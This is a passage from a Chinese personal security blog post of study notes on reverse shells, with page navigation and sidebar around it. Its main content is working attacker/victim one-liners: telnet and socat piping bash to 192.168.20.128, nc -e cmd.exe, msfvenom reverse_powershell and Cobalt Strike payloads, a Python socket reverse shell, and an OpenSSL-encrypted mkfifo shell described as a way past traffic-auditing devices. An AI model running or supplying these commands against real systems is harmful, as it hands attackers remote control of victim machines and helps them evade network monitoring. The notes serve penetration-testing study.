<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">攻击者：</span><br><span class="line">nc -nvlp 9998		<span class="comment">#输入命令</span></span><br><span class="line">nc -nvlp 8999		<span class="comment">#输出命令</span></span><br><span class="line"></span><br><span class="line">受害者：</span><br><span class="line">telnet 192.168.20.128 9998 | /bin/bash | telnet 192.168.20.128 8999</span><br></pre></td></tr></table></figure>

<p>本质就是telnet可以直接与服务器交互</p>
<h2 id="socat反弹"><a href="#socat反弹" class="headerlink" title="socat反弹"></a>socat反弹</h2><p>使用场景：需要受害者主机安装socat</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -lnvp 9999</span><br><span class="line"></span><br><span class="line">受害者：socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.20.128:9999</span><br></pre></td></tr></table></figure>

<p>socat 是什么？</p>
<p><code>socat</code> 是一个“多功能的 Socket 工具”，名字来自：</p>
<blockquote>
<p><strong>SO</strong>cket <strong>CAT</strong>, 类似 netcat 但功能更强大。</p>
</blockquote>
<p>它可以连接各种<strong>网络流</strong>和<strong>本地文件描述符</strong>、伪终端等。常用于：</p>
<ul>
<li>端口转发</li>
<li>构建代理</li>
<li>reverse shell</li>
<li>SSL 隧道</li>
<li>建立 TTY&#x2F;PTY 等</li>
</ul>
<h3 id="命令解释-5"><a href="#命令解释-5" class="headerlink" title="命令解释"></a>命令解释</h3><table>
<thead>
<tr>
<th>参数部分</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>exec:&#39;bash -li&#39;</code></td>
<td>表示启动一个进程，执行 <code>bash</code>，<code>-l</code> 是登录 shell，<code>-i</code> 是交互式</td>
</tr>
<tr>
<td><code>pty</code></td>
<td>为这个进程分配一个 <strong>伪终端</strong>（pseudo terminal），这是实现交互式 shell 的关键！</td>
</tr>
<tr>
<td><code>stderr</code></td>
<td>把标准错误（stderr）也通过 socket 发送（通常 stderr 不会重定向）</td>
</tr>
<tr>
<td><code>setsid</code></td>
<td>创建一个新的会话（session），防止受到原有终端的信号干扰</td>
</tr>
<tr>
<td><code>sigint</code></td>
<td>允许接收 <code>Ctrl+C</code>（SIGINT）中断信号</td>
</tr>
<tr>
<td><code>sane</code></td>
<td>设置终端为“标准模式”（sane mode），清理一些奇怪的终端设置</td>
</tr>
<tr>
<td><code>tcp:192.168.20.128:9999</code></td>
<td>远程攻击者监听的 IP 和端口，将流量转发过去</td>
</tr>
</tbody></table>
<h1 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h1><h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2><p>整体和linux上的差不多，也是需要下载netcat，只是把shell换成了cmd</p>
<p>netcat 下载：<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -lnvp 9999</span><br><span class="line">受害者：nc -e C:\windows\system32\cmd.exe 192.168.20.128 9999</span><br></pre></td></tr></table></figure>

<h2 id="MSF反弹"><a href="#MSF反弹" class="headerlink" title="MSF反弹"></a>MSF反弹</h2><p>使用 msfvenom -l 结合关键字过滤（如cmd&#x2F;windows&#x2F;reverse），找出我们可能需要的payload</p>
<p><code>msfvenom -l payloads | grep &#39;cmd/windows/reverse&#39;</code></p>
<p>生成命令</p>
<p><code>msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.20.128 LPORT=9999</code></p>
<p>先在msfconsole上进行使用payload</p>
<p><img src="/posts/2f610211/imagesimage-20250522231507975.png" alt="image-20250522231507975"></p>
<p>然后将生成的payload在受害者主机的cmd上执行(测试发现只有win10以下的主机才可以，win10及其以上会直接被防火墙拦截)</p>
<p><img src="/posts/2f610211/imagesimage-20250522231811617.png" alt="image-20250522231811617"></p>
<h2 id="CS反弹"><a href="#CS反弹" class="headerlink" title="CS反弹"></a>CS反弹</h2><p>首先要开启服务端cs</p>
<p><img src="/posts/2f610211/imagesimage-20250523003512772.png" alt="image-20250523003512772"></p>
<p>前面是cs服务器ip，后面是客户端连接密码</p>
<p><img src="/posts/2f610211/imagesimage-20250523003647746.png" alt="image-20250523003647746"></p>
<p><img src="/posts/2f610211/imagesimage-20250523003702591.png" alt="image-20250523003702591"></p>
<p>然后cs会生成一个payload，接着在受害者主机的cmd上运行就可以了</p>
<p><img src="/posts/2f610211/imagesimage-20250523003911384.png" alt="image-20250523003911384"></p>
<p>测试了还是只能在win10及其以下的系统运行，win10及其以上防火墙直接拦截</p>
<h1 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h1><p>通过nc…命令反弹shell得到的shell并不能称为完全交互的shell，通常称之为’哑’shell。<br>通常存在以下缺点</p>
<ol>
<li><p>ctrl-c会中断会话</p>
</li>
<li><p>无法正常使用vim等文本编辑器</p>
</li>
<li><p>没有向上箭头使用历史</p>
</li>
<li><p>无法执行交互式命令</p>
</li>
<li><p>无法查看错误输出</p>
</li>
<li><p>无法使用 tab 命令补全</p>
</li>
<li><p>无法操控jobcontrol</p>
</li>
</ol>
<p>因此有必要去获取一个完全交互的shell(只要获得一个伪终端就可以了)，方法就是在shell 中执行python，使用pty模块，创建一个原生的终端。下面提供两条命令，根据受害者主机python不同，选择不同版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>即修改成</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os,socket,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.20.128&#x27;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<p>或者用受害者主机直接下载远程vps的木马</p>
<h1 id="流量加密"><a href="#流量加密" class="headerlink" title="流量加密"></a>流量加密</h1><p>部分防护设备会对内外网传输流量进行审查，反弹shell执行命令都是以明文进行传输的，很容易被查杀。<br>因此需要将原始流量使用 openssl 加密，绕过流量审计设备。<br>1、首先kali上生成SSL证书的公钥&#x2F;私钥对,信息懒得填，一直回车即可。</p>
<p><code>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</code></p>
<p>2、kali使用 OpenSSL 监听一个端口</p>
<p><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</code></p>
<p>3、目标主机执行反弹加密shell</p>
<p><code>mkfifo /tmp/s; /bin/bash -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect ip:port &gt; /tmp/s; rm /tmp/s</code></p>
<h3 id="命令解释-6"><a href="#命令解释-6" class="headerlink" title="命令解释"></a>命令解释</h3><p><strong><code>mkfifo /tmp/s</code></strong>：</p>
<ul>
<li>创建一个名为 <code>/tmp/s</code> 的命名管道（FIFO）。</li>
</ul>
<p><strong><code>/bin/bash -i &lt; /tmp/s 2&gt;&amp;1</code></strong>：</p>
<ul>
<li>启动一个交互式 Bash Shell，标准输入从 <code>/tmp/s</code> 读取。</li>
<li><code>2&gt;&amp;1</code> 将标准错误重定向到标准输出，确保所有输出都通过同一通道发送。</li>
</ul>
<p><strong><code>| openssl s_client -quiet -connect ip:port &gt; /tmp/s</code></strong>：</p>
<ul>
<li>将 Bash 的输出通过管道传递给 OpenSSL 的 <code>s_client</code>，该客户端尝试连接到指定的 <code>ip:port</code>。</li>
<li><code>-quiet</code> 选项使输出更简洁，适用于数据传输。</li>
<li><code>&gt; /tmp/s</code> 将从远程主机接收到的数据写入 <code>/tmp/s</code>，供 Bash 作为输入读取。</li>
</ul>
<p><strong><code>rm /tmp/s</code></strong>：</p>
<ul>
<li>在连接结束后，删除创建的命名管道 <code>/tmp/s</code>，清理痕迹。</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://0xyyssh.github.io">yyssh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://0xyyssh.github.io/posts/2f610211.html">https://0xyyssh.github.io/posts/2f610211.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://0xyyssh.github.io" target="_blank">yyssh's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a></div><div class="post-share"><div class="social-share" data-image="/coverImages/default_bg9.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://lib.baomitu.com/social-share.js/1.0.16/css/share.min.css" media="print" onload="this.media='all'"><script src="https://lib.baomitu.com/social-share.js/1.0.16/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/2f57a694.html" title="正则表达式"><img class="cover" src="/coverImages/default_bg22.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">正则表达式</div></div><div class="info-2"><div class="info-item-1">正则表达式 正则表达式默认只匹配一个 正则表达式学习正则表达式（Regex）的开始与结束//代表正则表达式的开始与结束 &#x2F;匹配字符&#x2F; .默认可以匹配所有字符的所有个 []默认匹配字符集[]匹配字符集默认只匹配一个，[]里面可以理解为或者的意思  例如：上图regex的意思是匹配yanyuan1或2或3ooo [^]否定字符集匹配这里的否定字符集匹配是否定字符集的并集  例如：上图regex的意思是否定匹配yanyuan1或2或3ooo [-]字符集里面的范围表示[a-z]：小写字母范围 [A-Z]：大写字母范围 [0-9]：数字范围 [a-zA-Z0-9]：混合字母数字匹配 [\u4e00-\u9fa5]：中文匹配 [!-.]：!&quot;# $ % &amp; &#39; ( ) * +, - .一部分特殊字符匹配 [^a-zA-Z0-9\u4e00-\u9fa5]：特殊字符匹配，（换行符也匹配） *号匹配*号表示一个字符完全不匹配或可以匹配多次。例如，表示字母 e 在下方文本中不出现，只出现 1 次或者并排出现多次。  +号匹配+号表示一个字符可以出现一...</div></div></div></a><a class="pagination-related" href="/posts/56cf3280.html" title="javaWeb"><img class="cover" src="/coverImages/default_bg.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">javaWeb</div></div><div class="info-2"><div class="info-item-1">javaWebtomcat导入idea  添加成功tomcat之后，再将模块改为web模块  然后选择导入web框架即可  idea2024.1 配置Servlet踩坑idea没有自动识别java源码目录，maven的pom.xml，url的web目录，全部都要自己导入   java源码目录识别    web目录识别    maven的pom.xml导入     tomcat运行与修改 安装目录下解压下载的tomcat包，点击bin&#x2F;start.bat脚本 命令行中文乱码修改安装目录下的conf&#x2F;logging.properties文件  这4个编码修改成与命令行一样的编码就行了，中国的win11命令行默认是gbk 方法一：把上面四个编码改成GBK 方法二：修改命令行的编码为UTF-8 设置里面的更改国家和地区  选择管理语言设置  重启之后命令行的编码就是UTF-8了  tomcat网页启动端口修改还是安装目录下的conf&#x2F;server.xml  修改8080端口为9999  启动成功如下：  servlet基本概念  Servlet是运行在Web...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/8087d2e8.html" title="CTFshow_web_WP"><img class="cover" src="/coverImages/default_bg.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-19</div><div class="info-item-2">CTFshow_web_WP</div></div><div class="info-2"><div class="info-item-1">CTFshow-Web-WP工具不是万能的Web入门信息收集web-11开发者开发不仔细,注释留在了前端界面,通过检查界面源代码发现漏洞和flag,得到的flag可能是编码之前的,所以需要进行base64解码或者其他方式解码  web-212前端进行限制,无法查看页面源代码或者检查,通过view-source:url可以查看源代码 通过不断刷新进行F12检查也可以开启代码检查,然后禁用JavaScript  web-31通过BP抓包,respond返回请求携带信息泄露（flag）  web-4&#x3D;&#x3D;#如果是有明显的网站架构，可以优先扫描robots文件&#x3D;&#x3D; 1网页搜索引擎爬取网站的robots(.txt)文件,所以网站robots(.txt)文件也会信息泄露(flag)  web-51phps文件泄露,若目录扫描到,通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容,所以需要用phps文件代替。用户访问phps文件就能看到对应的php文件的源码。其中可能有flag  ...</div></div></div></a><a class="pagination-related" href="/posts/2f57a694.html" title="正则表达式"><img class="cover" src="/coverImages/default_bg22.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-21</div><div class="info-item-2">正则表达式</div></div><div class="info-2"><div class="info-item-1">正则表达式 正则表达式默认只匹配一个 正则表达式学习正则表达式（Regex）的开始与结束//代表正则表达式的开始与结束 &#x2F;匹配字符&#x2F; .默认可以匹配所有字符的所有个 []默认匹配字符集[]匹配字符集默认只匹配一个，[]里面可以理解为或者的意思  例如：上图regex的意思是匹配yanyuan1或2或3ooo [^]否定字符集匹配这里的否定字符集匹配是否定字符集的并集  例如：上图regex的意思是否定匹配yanyuan1或2或3ooo [-]字符集里面的范围表示[a-z]：小写字母范围 [A-Z]：大写字母范围 [0-9]：数字范围 [a-zA-Z0-9]：混合字母数字匹配 [\u4e00-\u9fa5]：中文匹配 [!-.]：!&quot;# $ % &amp; &#39; ( ) * +, - .一部分特殊字符匹配 [^a-zA-Z0-9\u4e00-\u9fa5]：特殊字符匹配，（换行符也匹配） *号匹配*号表示一个字符完全不匹配或可以匹配多次。例如，表示字母 e 在下方文本中不出现，只出现 1 次或者并排出现多次。  +号匹配+号表示一个字符可以出现一...</div></div></div></a><a class="pagination-related" href="/posts/56cf3280.html" title="javaWeb"><img class="cover" src="/coverImages/default_bg.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-20</div><div class="info-item-2">javaWeb</div></div><div class="info-2"><div class="info-item-1">javaWebtomcat导入idea  添加成功tomcat之后，再将模块改为web模块  然后选择导入web框架即可  idea2024.1 配置Servlet踩坑idea没有自动识别java源码目录，maven的pom.xml，url的web目录，全部都要自己导入   java源码目录识别    web目录识别    maven的pom.xml导入     tomcat运行与修改 安装目录下解压下载的tomcat包，点击bin&#x2F;start.bat脚本 命令行中文乱码修改安装目录下的conf&#x2F;logging.properties文件  这4个编码修改成与命令行一样的编码就行了，中国的win11命令行默认是gbk 方法一：把上面四个编码改成GBK 方法二：修改命令行的编码为UTF-8 设置里面的更改国家和地区  选择管理语言设置  重启之后命令行的编码就是UTF-8了  tomcat网页启动端口修改还是安装目录下的conf&#x2F;server.xml  修改8080端口为9999  启动成功如下：  servlet基本概念  Servlet是运行在Web...</div></div></div></a><a class="pagination-related" href="/posts/9cd054c0.html" title="2025ISCC区域赛Web-WP"><img class="cover" src="/coverImages/default_bg8.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-19</div><div class="info-item-2">2025ISCC区域赛Web-WP</div></div><div class="info-2"><div class="info-item-1">2025ISCC区域赛Web-WP比赛感受个人感觉ISCC（以前比赛没打过，不予评价）这次比赛完全没有web的特征，区域赛5个题，每一个题开始都要misc解密（哪吒吃藕联想到food传参，我是真想不到，这题最后也是misc汉字解密），就是群里人说的（Misc套一个Web前端就是Web题了？？？），Web考点考得也不是主要的，十八铜人阵考的ssti，前面要一大段的misc解密，ShallowSeek的web考点是一个ajax头（尼克杨问号脸？？？），只能说ISCC这次举办的web题就是依托 Web+基本功打开网址，是一段题目提示  重点在于这个用户代理身上（修改传输的UA）  只能一个一个尝试，最后在GaoJiGongChengShiFoYeGe(高级工程师佛耶戈)，拿到路由（Q2rN6h3YkZB9fL5j2WmX.php）  路由打开之后是一段需要绕过的源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpshow_source(__FILE...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">yyssh</div><div class="author-info-description">我要成web高手</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/0xYyssh"><i class="fab fa-github"></i><span>call me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFshell"><span class="toc-number">1.1.</span> <span class="toc-text">什么是shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.</span> <span class="toc-text">什么是反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.</span> <span class="toc-text">为什么要反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87%E6%94%AF%E6%8C%81%E7%9A%84%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">确定目标支持的反弹方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.5.</span> <span class="toc-text">bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A"><span class="toc-number">1.5.1.</span> <span class="toc-text">命令解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.6.</span> <span class="toc-text">python反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A-1"><span class="toc-number">1.6.1.</span> <span class="toc-text">命令解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.7.</span> <span class="toc-text">nc反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A-2"><span class="toc-number">1.7.1.</span> <span class="toc-text">命令解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.8.</span> <span class="toc-text">php反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A-3"><span class="toc-number">1.8.1.</span> <span class="toc-text">命令解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.9.</span> <span class="toc-text">java反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.10.</span> <span class="toc-text">exec反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#perl%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.11.</span> <span class="toc-text">perl反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A-4"><span class="toc-number">1.11.1.</span> <span class="toc-text">命令解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#awk%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.12.</span> <span class="toc-text">awk反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E9%87%8A"><span class="toc-number">1.12.1.</span> <span class="toc-text">代码解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#telnet%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.13.</span> <span class="toc-text">telnet反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socat%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.14.</span> <span class="toc-text">socat反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A-5"><span class="toc-number">1.14.1.</span> <span class="toc-text">命令解释</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.</span> <span class="toc-text">Windows反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nc%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.1.</span> <span class="toc-text">nc反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.2.</span> <span class="toc-text">MSF反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CS%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.3.</span> <span class="toc-text">CS反弹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="toc-number">3.</span> <span class="toc-text">交互式shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86"><span class="toc-number">4.</span> <span class="toc-text">流量加密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A-6"><span class="toc-number">4.0.1.</span> <span class="toc-text">命令解释</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/2f57a694.html" title="正则表达式"><img src="/coverImages/default_bg22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="正则表达式"/></a><div class="content"><a class="title" href="/posts/2f57a694.html" title="正则表达式">正则表达式</a><time datetime="2026-01-21T10:29:05.000Z" title="发表于 2026-01-21 18:29:05">2026-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2f610211.html" title="反弹shell"><img src="/coverImages/default_bg9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反弹shell"/></a><div class="content"><a class="title" href="/posts/2f610211.html" title="反弹shell">反弹shell</a><time datetime="2026-01-21T10:19:52.000Z" title="发表于 2026-01-21 18:19:52">2026-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/56cf3280.html" title="javaWeb"><img src="/coverImages/default_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="javaWeb"/></a><div class="content"><a class="title" href="/posts/56cf3280.html" title="javaWeb">javaWeb</a><time datetime="2026-01-20T09:33:15.000Z" title="发表于 2026-01-20 17:33:15">2026-01-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/6213db3a.html" title="知攻善防WP"><img src="/coverImages/default_bg2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="知攻善防WP"/></a><div class="content"><a class="title" href="/posts/6213db3a.html" title="知攻善防WP">知攻善防WP</a><time datetime="2026-01-04T08:27:09.000Z" title="发表于 2026-01-04 16:27:09">2026-01-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/143a4fd3.html" title="blogLearn"><img src="/coverImages/default_bg5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="blogLearn"/></a><div class="content"><a class="title" href="/posts/143a4fd3.html" title="blogLearn">blogLearn</a><time datetime="2026-01-04T03:46:15.000Z" title="发表于 2026-01-04 11:46:15">2026-01-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/images/top6.jpg);"><div id="footer-wrap"><div id="footer-left"><div class="footer-title"><span>yyssh's blog | </span><span class="footer-copyright">&copy;2025 - 2026 <i class="fa-fw fas fa-heartbeat card-announcement-animation cc_pointer"></i> By yyssh</span></div><div class="wordcount"></div><span>yyssh 已经写了 98.1k 字，</span><span>写到西游记第41回，灭法国剃头避祸，发型太丑不敢见人，摆烂啊</span></div><div id="footer-right"><div class="footer-totop"><i class="fas fa-chevron-up" onclick="btf.scrollToDest(0, 500)"></i></div><div class="footer-info"><span class="footer-runtime"></span><span class="footer-by"></span></div><div class="footer-service"><a target="_blank" href="https://hexo.io/zh-cn/"><img alt="hexo" src="/shieldImages/hexo.jpg"/></a><a target="_blank" href="https://github.com/0xYyssh"><img alt="github" src="/shieldImages/github.jpg"/></a><a target="_blank" href="https://www.bilibili.com/video/BV12om2YTEgW/?spm_id_from=333.1387.favlist.content.click&amp;vd_source=f2e427ac71efa3412ac58124c4df9be1"><img alt="github" src="/shieldImages/web.jpg"/></a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"></div><script src="/js/foot.js" async></script><script async data-pjax src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="background:url(coverImages/default_bg18.jpg);border-radius:12px;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-09-04</span><a class="blog-slider__title" onclick="window.open(&quot;posts/8dc02fc6.html&quot;);" href="javascript:void(0);" alt="">第二届陇剑杯初赛学习WP</a><div class="blog-slider__text">个人对第二届陇剑杯的复现学习WP笔记</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(coverImages/default_bg2.jpg);border-radius:12px;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2026-01-04</span><a class="blog-slider__title" onclick="window.open(&quot;posts/6213db3a.html&quot;);" href="javascript:void(0);" alt="">知攻善防WP</a><div class="blog-slider__text">对知攻善防靶场的一些复现笔记，不喜勿喷！</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(coverImages/default_bg12.jpg);border-radius:12px;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-05-19</span><a class="blog-slider__title" onclick="window.open(&quot;posts/a691451b.html&quot;);" href="javascript:void(0);" alt="">2025ISCC区域赛Misc-WP</a><div 